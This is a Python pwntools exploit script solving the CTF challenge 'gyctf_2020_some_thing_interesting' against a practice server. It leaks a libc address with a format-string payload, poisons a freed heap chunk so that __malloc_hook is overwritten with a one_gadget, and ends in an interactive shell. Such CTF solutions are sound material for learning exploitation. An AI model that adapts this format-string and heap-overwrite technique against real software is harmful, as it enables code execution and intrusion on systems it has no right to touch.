#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/27 23:17:57
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process("gyctf_2020_some_thing_interesting")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node3.buuoj.cn'
    port = 29602
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF("gyctf_2020_some_thing_interesting")

def cmd(choice):
    sh.recvuntil("> Now please tell me what you want to do :")
    sh.sendline(str(choice))

def add(size_1,content_1,size_2,content_2):
    cmd(1)
    sh.recvuntil("> O's length : ")
    sh.sendline(str(size_1))
    sh.recvuntil("> O : ")
    sh.sendline(content_1)
    sh.recvuntil("> RE's length : ")
    sh.sendline(str(size_2))
    sh.recvuntil("> RE : ")
    sh.sendline(content_2)

def edit(index,content_1,content_2):
    cmd(2)
    sh.recvuntil("> Oreo ID : ")
    sh.sendline(str(index))
    sh.recvuntil("> O : ")
    sh.sendline(content_1)
    sh.recvuntil("> RE : ")
    sh.sendline(content_2)

def dele(index):
    cmd(3)
    sh.recvuntil("> Oreo ID : ")
    sh.sendline(str(index))

def show(index):
    cmd(4)
    sh.recvuntil("> Oreo ID : ")
    sh.sendline(str(index))

#leak libc
sh.recvuntil("> Input your code please:")
payload = "OreOOrereOOreO%17$p"
sh.sendline(payload)
cmd(0)
sh.recvuntil("OreOOrereOOreO0x")
libc_base = int(sh.recv(12),16) - 240 - libc.symbols['__libc_start_main']

log.info("Success get libc_base:0x%x"%libc_base)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + one[3]
#cover malloc_hook => one_gadget
add(0x68,"aaaa",0x68,"aaaa")
dele(1)
payload = p64(malloc_hook-0x23)
edit(1,"aaaa",payload)
payload = "a" * 0x13 + p64(one_gadget)
add(0x68,"aaaa",0x68,payload)
cmd(1)
sh.recvuntil("> O's length : ")
sh.sendline(str(1))
sh.interactive()